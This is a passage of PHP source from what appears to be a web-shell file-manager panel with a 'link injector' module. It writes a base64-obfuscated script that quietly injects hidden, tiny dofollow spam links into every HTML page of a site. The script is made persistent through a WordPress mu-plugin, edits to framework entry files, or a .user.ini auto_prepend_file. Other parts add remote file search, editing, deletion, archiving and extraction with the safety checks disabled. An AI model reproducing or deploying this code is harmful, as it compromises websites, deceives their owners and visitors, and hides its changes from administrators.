        $renderCode = $_cryo_fn('PD9waHAKICAgIC8vIENSWU9fTElOS19SRU5ERVIgKGR1YWw6IG9iX3N0YXJ0ICsgc2h1dGRvd24gZmFs'.'bGJhY2sgYWdhciB0ZXRhcCBqYWxhbiBkaSBDb2RlSWduaXRlciBkbGwpCiAgICBpZiAoZGVmaW5lZCgi'.'Q1JZT19MSU5LX0JPT1RFRCIpKSByZXR1cm47CiAgICBkZWZpbmUoIkNSWU9fTElOS19CT09URUQiLCB0'.'cnVlKTsKICAgICRjYWNoZSA9IF9fRElSX18uIi8uc2l0ZV9saW5rcy5qc29uIjsKICAgIGlmKCFmaWxl'.'X2V4aXN0cygkY2FjaGUpKSByZXR1cm47CiAgICAkZGF0YSA9IGpzb25fZGVjb2RlKGZpbGVfZ2V0X2Nv'.'bnRlbnRzKCRjYWNoZSksIHRydWUpOwogICAgaWYoZW1wdHkoJGRhdGFbImxpbmtzIl0pKSByZXR1cm47'.'CiAgICAkR0xPQkFMU1siQ1JZT19MSU5LX0RBVEEiXSA9ICRkYXRhOwogICAgJEdMT0JBTFNbIkNSWU9f'.'TElOS19ET05FIl0gPSBmYWxzZTsKCiAgICAvLyBCdWlsZGVyIGhlbHBlcgogICAgaWYgKCFmdW5jdGlv'.'bl9leGlzdHMoImNyeW9fbGlua19idWlsZF9odG1sIikpIHsKICAgICAgICBmdW5jdGlvbiBjcnlvX2xp'.'bmtfYnVpbGRfaHRtbCgkZGF0YSl7CiAgICAgICAgICAgICRodG1sID0gIlxuPCEtLSBQQU5FTCBMSU5L'.'UyBTVEFSVCAtLT5cbiI7CiAgICAgICAgICAgIGZvcmVhY2goJGRhdGFbImxpbmtzIl0gYXMgJGwpewog'.'ICAgICAgICAgICAgICAgaWYoZW1wdHkoJGxbInVybCJdKSB8fCBlbXB0eSgkbFsiYW5jaG9yIl0pKSBj'.'b250aW51ZTsKICAgICAgICAgICAgICAgICR1ID0gaHRtbHNwZWNpYWxjaGFycygkbFsidXJsIl0sIEVO'.'VF9RVU9URVMpOwogICAgICAgICAgICAgICAgJGEgPSBodG1sc3BlY2lhbGNoYXJzKCRsWyJhbmNob3Ii'.'XSwgRU5UX1FVT1RFUyk7CiAgICAgICAgICAgICAgICAkciA9ICFlbXB0eSgkbFsicmVsIl0pID8gaHRt'.'bHNwZWNpYWxjaGFycygkbFsicmVsIl0pIDogImRvZm9sbG93IjsKICAgICAgICAgICAgICAgICRzdHls'.'ZSA9ICJmb250LXNpemU6MXB4OyI7CiAgICAgICAgICAgICAgICBpZighZW1wdHkoJGxbImhpZGRlbiJd'.'KSkgJHN0eWxlIC49ICJkaXNwbGF5Om5vbmU7IjsKICAgICAgICAgICAgICAgICRodG1sIC49ICI8YSBo'.'cmVmPVwiIi4kdS4iXCIgcmVsPVwiIi4kci4iXCIgc3R5bGU9XCIiLiRzdHlsZS4iXCI+Ii4kYS4iPC9h'.'PiAiOwogICAgICAgICAgICB9CiAgICAgICAgICAgICRodG1sIC49ICJcbjwhLS0gUEFORUwgTElOS1Mg'.'RU5EIC0tPlxuIjsKICAgICAgICAgICAgcmV0dXJuICRodG1sOwogICAgICAgIH0KICAgIH0KICAgIGlm'.'ICghZnVuY3Rpb25fZXhpc3RzKCJjcnlvX2xpbmtfc2hvdWxkX2luamVjdF9idWYiKSkgewogICAgICAg'.'IGZ1bmN0aW9uIGNyeW9fbGlua19zaG91bGRfaW5qZWN0X2J1ZigkYnVmKXsKICAgICAgICAgICAgaWYg'.'KGZ1bmN0aW9uX2V4aXN0cygiaGVhZGVyc19saXN0IikpIHsKICAgICAgICAgICAgICAgIGZvcmVhY2gg'.'KGhlYWRlcnNfbGlzdCgpIGFzICRoKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKHN0cmlwb3MoJGgs'.'ICJjb250ZW50LXR5cGU6IikgPT09IDApIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHN0cmlw'.'b3MoJGgsICJ0ZXh0L2h0bWwiKSA9PT0gZmFsc2UpIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgICAg'.'ICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAg'.'ICAgICAgICB9CiAgICAgICAgICAgICR0cmltID0gbHRyaW0oJGJ1Zik7CiAgICAgICAgICAgIGlmIChp'.'c3NldCgkdHJpbVswXSkgJiYgKCR0cmltWzBdID09PSAieyIgfHwgJHRyaW1bMF0gPT09ICJbIikpIHJl'.'dHVybiBmYWxzZTsKICAgICAgICAgICAgaWYgKHN0cmlwb3Moc3Vic3RyKCRidWYsIDAsIDIwMCksICI8'.'P3htbCIpICE9PSBmYWxzZSkgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICByZXR1cm4gdHJ1ZTsKICAg'.'ICAgICB9CiAgICB9CgogICAgb2Jfc3RhcnQoZnVuY3Rpb24oJGJ1ZiwgJHBoYXNlKXsKICAgICAgICAk'.'ZGF0YSA9IGlzc2V0KCRHTE9CQUxTWyJDUllPX0xJTktfREFUQSJdKSA/ICRHTE9CQUxTWyJDUllPX0xJ'.'TktfREFUQSJdIDogbnVsbDsKICAgICAgICBpZiAoISRkYXRhKSByZXR1cm4gJGJ1ZjsKICAgICAgICAv'.'LyBTYWF0IGZyYW1ld29yayBsYWluIG1lbWFuZ2dpbCBvYl9jbGVhbiAvIG9iX2VuZF9jbGVhbiwgamFu'.'Z2FuIGtsYWltIGRvbmUuCiAgICAgICAgaWYgKCRwaGFzZSAmIFBIUF9PVVRQVVRfSEFORExFUl9DTEVB'.'TikgcmV0dXJuICRidWY7CiAgICAgICAgaWYgKCFjcnlvX2xpbmtfc2hvdWxkX2luamVjdF9idWYoJGJ1'.'ZikpIHJldHVybiAkYnVmOwogICAgICAgICRodG1sID0gY3J5b19saW5rX2J1aWxkX2h0bWwoJGRhdGEp'.'OwogICAgICAgIGlmIChzdHJpcG9zKCRidWYsICI8L2JvZHk+IikgIT09IGZhbHNlKSB7CiAgICAgICAg'.'ICAgICRHTE9CQUxTWyJDUllPX0xJTktfRE9ORSJdID0gdHJ1ZTsKICAgICAgICAgICAgcmV0dXJuIHBy'.'ZWdfcmVwbGFjZSgiLzxcL2JvZHk+L2kiLCAkaHRtbC4iPC9ib2R5PiIsICRidWYsIDEpOwogICAgICAg'.'IH0KICAgICAgICAvLyBCdWZmZXIgbWVuZ2FuZHVuZyBIVE1MIHRhcGkgdGFucGEgPC9ib2R5PiAtPiBh'.'cHBlbmQgZGkgYWtoaXIuCiAgICAgICAgaWYgKHN0cmlwb3MoJGJ1ZiwgIjxodG1sIikgIT09IGZhbHNl'.'IHx8IHN0cmlwb3MoJGJ1ZiwgIjwhZG9jdHlwZSIpICE9PSBmYWxzZSB8fCBzdHJpcG9zKCRidWYsICI8'.'Ym9keSIpICE9PSBmYWxzZSkgewogICAgICAgICAgICAkR0xPQkFMU1siQ1JZT19MSU5LX0RPTkUiXSA9'.'IHRydWU7CiAgICAgICAgICAgIHJldHVybiAkYnVmIC4gJGh0bWw7CiAgICAgICAgfQogICAgICAgIHJl'.'dHVybiAkYnVmOwogICAgfSwgMCwgUEhQX09VVFBVVF9IQU5ETEVSX1NUREZMQUdTKTsKCiAgICAvLyBT'.'aHV0ZG93biBmYWxsYmFjazogZGlwYWthaSBrYWxhdSBmcmFtZXdvcmsgbWVtYnVhbmcgYnVmZmVyIGtp'.'dGEgKENvZGVJZ25pdGVyLCBkbGwpLgogICAgcmVnaXN0ZXJfc2h1dGRvd25fZnVuY3Rpb24oZnVuY3Rp'.'b24oKXsKICAgICAgICBpZiAoIWVtcHR5KCRHTE9CQUxTWyJDUllPX0xJTktfRE9ORSJdKSkgcmV0dXJu'.'OwogICAgICAgICRkYXRhID0gaXNzZXQoJEdMT0JBTFNbIkNSWU9fTElOS19EQVRBIl0pID8gJEdMT0JB'.'TFNbIkNSWU9fTElOS19EQVRBIl0gOiBudWxsOwogICAgICAgIGlmICghJGRhdGEpIHJldHVybjsKICAg'.'ICAgICAvLyBDZWsgQ29udGVudC1UeXBlIGhlYWRlciBzZWthbGkgbGFnaQogICAgICAgIGlmIChmdW5j'.'dGlvbl9leGlzdHMoImhlYWRlcnNfbGlzdCIpKSB7CiAgICAgICAgICAgIGZvcmVhY2ggKGhlYWRlcnNf'.'bGlzdCgpIGFzICRoKSB7CiAgICAgICAgICAgICAgICBpZiAoc3RyaXBvcygkaCwgImNvbnRlbnQtdHlw'.'ZToiKSA9PT0gMCkgewogICAgICAgICAgICAgICAgICAgIGlmIChzdHJpcG9zKCRoLCAidGV4dC9odG1s'.'IikgPT09IGZhbHNlKSByZXR1cm47CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAg'.'ICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgLy8gSFRUUCByZWRpcmVjdHMgKExv'.'Y2F0aW9uIGhlYWRlcikgLSBqYW5nYW4gaW5qZWN0CiAgICAgICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygi'.'aGVhZGVyc19saXN0IikpIHsKICAgICAgICAgICAgZm9yZWFjaCAoaGVhZGVyc19saXN0KCkgYXMgJGgp'.'IHsKICAgICAgICAgICAgICAgIGlmIChzdHJpcG9zKCRoLCAibG9jYXRpb246IikgPT09IDApIHJldHVy'.'bjsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlY2hvIGNyeW9fbGlua19idWlsZF9odG1s'.'KCRkYXRhKTsKICAgIH0pOw==');
          if (@file_put_contents($renderFile, $renderCode) === false) {
              echo json_encode(['success'=>false,'error'=>'Gagal tulis .panel_render.php di '.$writeRoot]); exit;
          }

          // ---- 3) Wire it up per framework ----
          $mode = '';
          $modActions = array();
          if ($fw === 'wp') {
              $muDir = $root . '/wp-content/mu-plugins';
              if (!is_dir($muDir)) @mkdir($muDir, 0755, true);
              $pluginPath = $muDir . '/panel-links.php';
              $pluginCode = '<?php
    // CRYO_LINK_MU
    if(!defined("ABSPATH")) exit;
    add_action("init",function(){
        $f = ABSPATH.".panel_render.php";
        if(file_exists($f)) include $f;
    });';
              @file_put_contents($pluginPath, $pluginCode);
              // panel_render.php for WP must live at ABSPATH (= $root)
              if ($writeRoot !== $root) {
                  @copy($renderFile, $root.'/.panel_render.php');
                  @copy($linkCache, $root.'/.site_links.json');
              }
              $mode = 'wp-mu-plugin';
              $modActions[] = 'WordPress mu-plugin: '.$pluginPath;
              $modActions[] = '.panel_render.php: '.$root.'/.panel_render.php';
              $modActions[] = '.site_links.json: '.$root.'/.site_links.json';
          } elseif ($entryFile !== '' && is_file($entryFile) && is_writable($entryFile)) {
              // Inject prepend line into framework entry file
              $orig = (string)@file_get_contents($entryFile);
              // Strip any previous CRYO_LINK_INJECT block first (idempotent).
              // Hapus baik bentuk standalone (open+close tag) maupun bentuk inline 1 baris.
              $cleaned = preg_replace('/<\?php\s*\/\*\s*CRYO_LINK_INJECT_START\s*\*\/.*?\/\*\s*CRYO_LINK_INJECT_END\s*\*\/\s*\?>\s*\R?/s', '', $orig);
              $cleaned = preg_replace('/[ \t]*\/\*\s*CRYO_LINK_INJECT_START\s*\*\/.*?\/\*\s*CRYO_LINK_INJECT_END\s*\*\/\s*\R?/s', '', $cleaned);
              // Backup the entry file once
              if (!file_exists($entryFile.'.cryo_bak')) {
                  @copy($entryFile, $entryFile.'.cryo_bak');
              }
              // Sisipkan ke DALAM opening tag PHP yang sudah ada supaya tidak ada 2 pembuka.
              // Trim BOM dulu (kalau ada).
              $bom = "\xEF\xBB\xBF";
              $hasBom = (substr($cleaned, 0, 3) === $bom);
              if ($hasBom) $cleaned = substr($cleaned, 3);
              $injectInline = " /* CRYO_LINK_INJECT_START */ @include_once __DIR__.'/.panel_render.php'; /* CRYO_LINK_INJECT_END */\n";
              $injectStandalone = "<?php /* CRYO_LINK_INJECT_START */ @include_once __DIR__.'/.panel_render.php'; /* CRYO_LINK_INJECT_END */ ?>\n";
              if (preg_match('/^<\?php\b/i', $cleaned, $mPhp)) {
                  // Sisip langsung setelah opening tag PHP pada baris pertama
                  $newContent = preg_replace('/^<\?php\b/i', '<?php' . $injectInline, $cleaned, 1);
              } elseif (preg_match('/^<\?=/', $cleaned)) {
                  // Echo short tag: prepend standalone block sebelum echo
                  $newContent = $injectStandalone . $cleaned;
              } else {
                  // Bukan PHP file murni: prepend standalone block
                  $newContent = $injectStandalone . $cleaned;
              }
              if ($hasBom) $newContent = $bom . $newContent;
              if (@file_put_contents($entryFile, $newContent) === false) {
                  echo json_encode(['success'=>false,'error'=>'Gagal inject ke '.$entryFile]); exit;
              }
              $mode = $fw.'-entry-prepend';
              $modActions[] = 'Entry file di-prepend: '.$entryFile;
              $modActions[] = 'Backup entry: '.$entryFile.'.cryo_bak';
              $modActions[] = '.panel_render.php: '.$renderFile;
              $modActions[] = '.site_links.json: '.$linkCache;
          } else {
              // Fallback: .user.ini at $writeRoot (default mode)
              $userIni = $writeRoot . '/.user.ini';
              $iniLine = '; CRYO_LINK_AUTO_PREPEND' . "\n" . 'auto_prepend_file=' . $renderFile . "\n";
              if (is_writable($writeRoot) || (is_file($userIni) && is_writable($userIni))) {
                  if (!file_exists($userIni)) {
                      @file_put_contents($userIni, $iniLine);
                  } else {
                      $content = (string)@file_get_contents($userIni);
                      $content = preg_replace('/^[ \t]*;[ \t]*CRYO_LINK_AUTO_PREPEND[ \t]*\R/mi', '', $content);
                      $content = preg_replace('/^[ \t]*auto_prepend_file[ \t]*=[^\r\n]*\R?/mi', '', $content);
                      @file_put_contents($userIni, $iniLine . $content);
                  }
                  $mode = 'user-ini-auto-prepend';
                  $modActions[] = '.user.ini: '.$userIni;
                  $modActions[] = '.panel_render.php: '.$renderFile;
                  $modActions[] = '.site_links.json: '.$linkCache;
              } else {
                  $mode = 'user-ini-not-writable';
                  $modActions[] = 'GAGAL tulis .user.ini di '.$writeRoot;
              }
          }

          // ---- 4) Generate downloadable deploy report ----
          $reportId = bin2hex(@function_exists('random_bytes') ? random_bytes(12) : pack('H*', md5(uniqid('', true).mt_rand())));
          $reportDir = sys_get_temp_dir();
          $reportFile = $reportDir . DIRECTORY_SEPARATOR . 'cryo_link_report_' . $reportId . '.txt';
          $rep  = "==========================================\n";
          $rep .= " CRYO LINK INJECTOR - DEPLOY REPORT\n";
          $rep .= "==========================================\n";
          $rep .= "Timestamp     : ".date('Y-m-d H:i:s T')."\n";
          $rep .= "Scope (root)  : ".$root."\n";
          $rep .= "Framework chs : ".$fwChoice."\n";
          $rep .= "Detected      : ".$detected."\n";
          $rep .= "Used framework: ".$fw."\n";
          $rep .= "Write root    : ".$writeRoot."\n";
          $rep .= "Mode          : ".$mode."\n";
          $rep .= "Total links   : ".count($links)."\n";
          $rep .= "------------------------------------------\n";
          $rep .= "FILE ACTIONS:\n";
          foreach ($modActions as $ma) { $rep .= "  - ".$ma."\n"; }
          $rep .= "------------------------------------------\n";
          $rep .= "LINKS:\n";
          foreach ($links as $idx=>$l) {
              $rep .= "  ".($idx+1).". ".$l['anchor']." -> ".$l['url']." [rel=".$l['rel'].($l['hidden']?", hidden":"")."]\n";
          }
          $rep .= "==========================================\n";
          $rep .= "NOTE: File laporan ini akan otomatis terhapus setelah didownload.\n";
          @file_put_contents($reportFile, $rep);
          // Token signature: hmac of id with session secret to prevent guessing
          $sigKey = isset($_SESSION['CRYO_REPORT_KEY']) ? $_SESSION['CRYO_REPORT_KEY'] : '';
          if ($sigKey === '') { $sigKey = bin2hex(@function_exists('random_bytes') ? random_bytes(16) : pack('H*', md5(uniqid('s',true)))); $_SESSION['CRYO_REPORT_KEY'] = $sigKey; }
          $sig = hash_hmac('sha256', $reportId, $sigKey);

          echo json_encode([
              'success'=>true,'mode'=>$mode,'count'=>count($links),'scope'=>$root,
              'framework'=>$fw,'detected'=>$detected,'write_root'=>$writeRoot,
              'report_id'=>$reportId,'report_sig'=>$sig
          ]);
          exit;
      }
      if (isset($_POST['cryo_link_inject_off'])) {
          header('Content-Type: application/json');
          if (!$isAdmin) { echo json_encode(['success'=>false,'error'=>'Hanya admin.']); exit; }
          $root = isset($_POST['scope']) ? rtrim(str_replace('\\','/',(string)$_POST['scope']),'/') : $directory;
          if (!is_dir($root)) { echo json_encode(['success'=>false,'error'=>'Scope invalid: '.$root]); exit; }
          $deleted = [];
          $failed  = [];
          $restored = [];
          // Candidate dirs where panel files might live
          $candidateRoots = array($root);
          foreach (array('/public','/web','/frontend/web','/backend/web') as $sub) {
              if (is_dir($root.$sub)) $candidateRoots[] = $root.$sub;
          }
          // Files to delete
          $files = array($root . '/wp-content/mu-plugins/panel-links.php');
          foreach ($candidateRoots as $cr) {
              $files[] = $cr . '/.site_links.json';
              $files[] = $cr . '/.panel_render.php';
              $files[] = $cr . '/.site_agent.json';
          }
          foreach ($files as $f) {
              if (is_file($f)) {
                  if (@unlink($f)) $deleted[] = $f; else $failed[] = $f;
              }
          }
          // Restore framework entry files: any *.cryo_bak found in candidate dirs as index.php.cryo_bak
          foreach ($candidateRoots as $cr) {
              $bak = $cr . '/index.php.cryo_bak';
              $entry = $cr . '/index.php';
              if (is_file($bak)) {
                  // Either restore from backup, or just strip the inject block
                  if (is_writable($entry) || !file_exists($entry)) {
                      if (@copy($bak, $entry)) { $restored[] = $entry; @unlink($bak); }
                      else $failed[] = $entry;
                  } else {
                      @unlink($bak);
                  }
              } elseif (is_file($entry) && is_writable($entry)) {
                  $orig = (string)@file_get_contents($entry);
                  $cleaned = preg_replace('/<\?php\s*\/\*\s*CRYO_LINK_INJECT_START\s*\*\/.*?\/\*\s*CRYO_LINK_INJECT_END\s*\*\/\s*\?>\s*\R?/s', '', $orig);
                  if ($cleaned !== $orig) {
                      @file_put_contents($entry, $cleaned);
                      $restored[] = $entry;
                  }
              }
          }
          // Clean .htaccess (legacy)
          $hta = $root . '/.htaccess';
          $htaCleaned = false;
          if (is_file($hta) && is_writable($hta)) {
              $content = (string)@file_get_contents($hta);
              $orig = $content;
              $content = preg_replace('/^[ \t]*#[ \t]*CRYO_LINK_AUTO_PREPEND[ \t]*\R/mi', '', $content);
              $content = preg_replace('/^[ \t]*php_value[ \t]+auto_prepend_file[ \t]+[^\r\n]*\.panel_render\.php[ \t]*\R?/mi', '', $content);
              if ($content !== $orig) {
                  @file_put_contents($hta, $content);
                  $htaCleaned = true;
              }
          }
          // Clean .user.ini in all candidate roots
          $userIniCleaned = false;
          foreach ($candidateRoots as $_ur) {
              $userIni = $_ur . '/.user.ini';
              if (is_file($userIni) && is_writable($userIni)) {
                  $content = (string)@file_get_contents($userIni);
                  $orig = $content;
                  $content = preg_replace('/^[ \t]*;[ \t]*CRYO_LINK_AUTO_PREPEND[ \t]*\R/mi', '', $content);
                  $content = preg_replace('/^[ \t]*auto_prepend_file[ \t]*=[^\r\n]*\.panel_render\.php[ \t]*\R?/mi', '', $content);
                  if ($content !== $orig) {
                      if (trim($content) === '') { @unlink($userIni); }
                      else { @file_put_contents($userIni, $content); }
                      $userIniCleaned = true;
                  }
              }
          }
          // Remove empty mu-plugins dir
          $muDir = $root . '/wp-content/mu-plugins';
          if (is_dir($muDir)) {
              $left = @scandir($muDir);
              if (is_array($left) && count(array_diff($left, array('.','..'))) === 0) @rmdir($muDir);
          }
          echo json_encode([
              'success'=>true,'deleted'=>$deleted,'failed'=>$failed,
              'restored'=>$restored,'htaccess_cleaned'=>$htaCleaned,'user_ini_cleaned'=>$userIniCleaned
          ]);
          exit;
      }

      // === CRYO LINK INJECTOR REPORT DOWNLOAD ===
      if (isset($_GET['cryo_report_dl']) && isset($_GET['sig'])) {
          if (!$isAdmin) { http_response_code(403); echo 'Forbidden'; exit; }
          $id  = preg_replace('/[^a-f0-9]/', '', (string)$_GET['cryo_report_dl']);
          $sig = preg_replace('/[^a-f0-9]/', '', (string)$_GET['sig']);
          $sigKey = isset($_SESSION['CRYO_REPORT_KEY']) ? $_SESSION['CRYO_REPORT_KEY'] : '';
          if ($id === '' || $sig === '' || $sigKey === '' || !hash_equals(hash_hmac('sha256', $id, $sigKey), $sig)) {
              http_response_code(403); echo 'Invalid token'; exit;
          }
          $reportFile = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'cryo_link_report_' . $id . '.txt';
          if (!is_file($reportFile)) { http_response_code(404); echo 'Report not found / sudah didownload.'; exit; }
          $body = (string)@file_get_contents($reportFile);
          @unlink($reportFile);
          $fname = 'cryo_link_report_' . date('Ymd_His') . '.txt';
          header('Content-Type: text/plain; charset=utf-8');
          header('Content-Disposition: attachment; filename="' . $fname . '"');
          header('Content-Length: ' . strlen($body));
          header('Cache-Control: no-store');
          echo $body;
          exit;
      }

      // === CRYO CODE EXPLORER (search filename + content recursively) ===
  if (isset($_POST['cryo_search'])) {
      header('Content-Type: application/json');
      if (!$isAdmin && !$isTeman) {
          echo json_encode(['success' => false, 'error' => 'Tidak memiliki izin.']);
          exit;
      }
      @set_time_limit(60);
      @ini_set('memory_limit', '256M');
  
      $query    = isset($_POST['q']) ? (string)$_POST['q'] : '';
      $scope    = isset($_POST['scope']) ? (string)$_POST['scope'] : $directory;
      $mode     = isset($_POST['mode']) ? (string)$_POST['mode'] : 'both'; // filename | content | both
      $pattern  = isset($_POST['pattern']) ? trim((string)$_POST['pattern']) : '';
      $caseSens = !empty($_POST['case_sens']);
      $useRegex = !empty($_POST['regex']);
      $maxResults  = max(1, min(2000, (int)(isset($_POST['max']) ? $_POST['max'] : 500)));
      $maxFileSize = 5 * 1024 * 1024; // 5 MB
      $maxFiles    = 20000;
  
      if ($query === '') {
          echo json_encode(['success' => false, 'error' => 'Query kosong.']);
          exit;
      }
      // Resolve scope
      $scope = rtrim(str_replace('\\', '/', $scope), '/');
      if ($scope === '' || !is_dir($scope)) {
          echo json_encode(['success' => false, 'error' => 'Path scope tidak valid: ' . htmlspecialchars($scope)]);
          exit;
      }
  
      // Build filename pattern matchers (comma separated globs e.g. "*.php,*.html")
      $patternList = [];
      if ($pattern !== '') {
          foreach (explode(',', $pattern) as $p) {
              $p = trim($p);
              if ($p === '') continue;
              // Auto-wrap: if no wildcard, treat as extension filter (e.g. "php" -> "*.php")
              if (strpos($p, '*') === false && strpos($p, '?') === false) {
                  $p = '*.' . ltrim($p, '.');
              }
              // Convert simple glob to regex
              $rx = '/^' . str_replace(['\.', '\*', '\?'], ['\.', '.*', '.'], preg_quote($p, '/')) . '$/i';
              $patternList[] = $rx;
          }
      }
      $matchesPattern = function($name) use ($patternList) {
          if (empty($patternList)) return true;
          foreach ($patternList as $rx) { if (preg_match($rx, $name)) return true; }
          return false;
      };
  
      // Build query matcher
      if ($useRegex) {
          $delim = '~';
          $flags = $caseSens ? '' : 'i';
          $regex = $delim . $query . $delim . $flags;
          // Validate
          if (@preg_match($regex, '') === false) {
              echo json_encode(['success' => false, 'error' => 'Regex tidak valid.']);
              exit;
          }
      } else {
          $regex = '~' . preg_quote($query, '~') . '~' . ($caseSens ? '' : 'i');
      }
  
      // Recursive scan with depth limit & skip dirs
      $skipDirs = ['.', '..', 'node_modules', '.git', '.svn', '.cryo_sessions', '.trash_cryo'];
      $results = [];
      $stat = ['files_scanned' => 0, 'files_with_match' => 0, 'truncated' => false];
      $start = microtime(true);
      $stack = [$scope];
      while (!empty($stack)) {
          if (count($results) >= $maxResults) { $stat['truncated'] = true; break; }
          if ($stat['files_scanned'] >= $maxFiles) { $stat['truncated'] = true; break; }
          if ((microtime(true) - $start) > 50) { $stat['truncated'] = true; break; }
          $dir = array_pop($stack);
          $kids = @scandir($dir);
          if (!is_array($kids)) continue;
          foreach ($kids as $k) {
              if (in_array($k, $skipDirs, true)) continue;
              $full = $dir . '/' . $k;
              if (is_link($full)) continue;
              if (is_dir($full)) {
                  $stack[] = $full;
                  continue;
              }
              if (!is_file($full)) continue;
              $stat['files_scanned']++;
  
              $name = basename($full);
              $hitFile = false;
  
              // Filter by pattern (apply to filename mode too)
              if (($mode === 'filename' || $mode === 'both') && !$matchesPattern($name)) {
                  // skip filename match if doesn't match glob filter
              } else
              // Filename match
              if ($mode === 'filename' || $mode === 'both') {
                  if (preg_match($regex, $name)) {
                      $results[] = [
                          'type' => 'filename',
                          'file' => $full,
                          'name' => $name,
                          'size' => @filesize($full),
                      ];
                      $hitFile = true;
                      if (count($results) >= $maxResults) { $stat['truncated'] = true; break 2; }
                  }
              }
              // Filter by pattern for content mode
              if ($mode !== 'filename' && !$matchesPattern($name)) continue;
  
              // Content match
              if ($mode === 'content' || $mode === 'both') {
                  $sz = @filesize($full);
                  if ($sz === false || $sz > $maxFileSize || $sz === 0) continue;
                  $fp = @fopen($full, 'rb');
                  if (!$fp) continue;
                  // Quick binary sniff (first 1024 bytes)
                  $head = @fread($fp, 1024);
                  if ($head !== false && strpos($head, "\x00") !== false) { @fclose($fp); continue; }
                  @fseek($fp, 0);
                  $lineNo = 0;
                  $matchesInFile = 0;
                  while (($line = @fgets($fp)) !== false) {
                      $lineNo++;
                      if (preg_match($regex, $line)) {
                          $clean = rtrim($line, "\r\n");
                          // Truncate long lines
                          if (strlen($clean) > 240) $clean = substr($clean, 0, 240) . '&';
                          $results[] = [
                              'type' => 'content',
                              'file' => $full,
                              'name' => $name,
                              'line' => $lineNo,
                              'preview' => $clean,
                          ];
                          $matchesInFile++;
                          if (count($results) >= $maxResults) { $stat['truncated'] = true; @fclose($fp); break 3; }
                          if ($matchesInFile >= 20) break; // cap per-file
                      }
                  }
                  @fclose($fp);
                  if ($matchesInFile > 0) $stat['files_with_match']++;
              }
          }
      }
      $stat['elapsed_ms'] = (int)((microtime(true) - $start) * 1000);
      echo json_encode(['success' => true, 'results' => $results, 'stat' => $stat], JSON_UNESCAPED_SLASHES);
      exit;
  }
  
  if (isset($_POST['save_edit'])) {
    header('Content-Type: application/json');
    if (!$isAdmin && !$isTeman) {
        echo json_encode(['success' => false, 'error' => 'Tidak memiliki izin.']);
        exit;
    }
    $file = sanitizePath($_POST['file']);
    $content = $_POST['content'];
    $full = $directory . '/' . $file;
    if (false) {
        echo json_encode(['success' => false, 'error' => 'Tidak diizinkan mengedit .htaccess.']);
        exit;
    }
    if (!is_file($full) || !is_writable($full)) {
        echo json_encode(['success' => false, 'error' => 'File tidak writable.']);
        exit;
    }
    if (file_put_contents($full, $content) !== false) {
        echo json_encode(['success' => true]);
    } else {
        echo json_encode(['success' => false, 'error' => 'Gagal menulis file.']);
    }
    exit;
}

// === AJAX DELETE ===
if (isset($_GET['ajax_delete']) && isset($_POST['target'])) {
    if (!$isAdmin && !$isTeman) {
        header('Content-Type: application/json');
        echo json_encode(['success' => false, 'error' => 'Anda tidak memiliki izin.']);
        exit;
    }
    $target = sanitizePath($_POST['target']);
    $folder = isset($_GET['folder']) ? sanitizePath($_GET['folder']) : $_SERVER['DOCUMENT_ROOT'];
    $fullPath = $folder . '/' . $target;
    
    if (false) {
        header('Content-Type: application/json');
        echo json_encode(['success' => false, 'error' => 'Tidak diizinkan menghapus .htaccess.']);
        exit;
    }
    
    $success = moveToTrash($fullPath);
    header('Content-Type: application/json');
    echo json_encode(['success' => $success]);
    exit;
}

if (isset($_POST['deleteSelected']) && !empty($_POST['selectedItems'])) {
    if (!$isAdmin && !$isTeman) {
        $_SESSION['error'] = 'Anda tidak memiliki izin.';
    } else {
        foreach ($_POST['selectedItems'] as $selected) {
            $pathToDelete = $directory . '/' . sanitizePath($selected);
            if (false) {
                continue;
            }
            moveToTrash($pathToDelete);
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === MULTI ZIP / ARCHIVE ===
if (isset($_POST['zipSelected']) && !empty($_POST['selectedItems'])) {
    $format = isset($_POST['archive_format']) ? $_POST['archive_format'] : 'zip';
    $allowedFormats = ['zip', 'tar', 'tar.gz', 'tar.bz2'];
    if (!in_array($format, $allowedFormats)) $format = 'zip';

    $zipName = "archive_" . date('Ymd_His') . '.' . ($format === 'tar.gz' ? 'tar.gz' : ($format === 'tar.bz2' ? 'tar.bz2' : $format));
    $zipPath = $directory . '/' . $zipName;

    $itemsToArchive = [];
    foreach ($_POST['selectedItems'] as $selected) {
        $fullItem = $directory . '/' . sanitizePath($selected);
        if (file_exists($fullItem)) {
            $itemsToArchive[] = $fullItem;
        }
    }

    if (createArchive($itemsToArchive, $zipPath, $format)) {
    } else {
        $_SESSION['error'] = "Gagal membuat arsip dengan format $format.";
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === EXTRACT ARCHIVE ===
if (isset($_POST['extractArchive'])) {
    if (!$isAdmin && !$isTeman) {
        $_SESSION['error'] = 'Role ini tidak dapat mengekstrak arsip.';
    } else {
        try {
            $archiveFile = basename($_POST['archive_file']);
            $destDir = trim($_POST['extract_dest']);
            $destDir = str_replace(chr(0), '', $destDir);
            $destDir = str_replace(['../', '..\\\\'], '', $destDir);
            $fullArchive = $directory . '/' . $archiveFile;

            if (!file_exists($fullArchive)) {
                $_SESSION['error'] = "File arsip tidak ditemukan: " . htmlspecialchars($archiveFile);
            } elseif (empty($destDir)) {
                $_SESSION['error'] = "Folder tujuan kosong.";
            } else {
                if (!is_dir($destDir)) {
                    @mkdir($destDir, 0755, true);
                }
                if (!is_dir($destDir)) {
                    $_SESSION['error'] = "Tidak bisa membuat folder tujuan: " . htmlspecialchars($destDir);
                } elseif (!is_writable($destDir)) {
                    $_SESSION['error'] = "Folder tujuan tidak writable: " . htmlspecialchars($destDir);
                } elseif (extractArchive($fullArchive, $destDir)) {
                    $_SESSION['success'] = "Ekstraksi berhasil ke " . htmlspecialchars($destDir);
                } else {
                    $_SESSION['error'] = "Gagal mengekstrak. Cek format arsip & permission folder.";
                }
            }
        } catch (Throwable $e) {
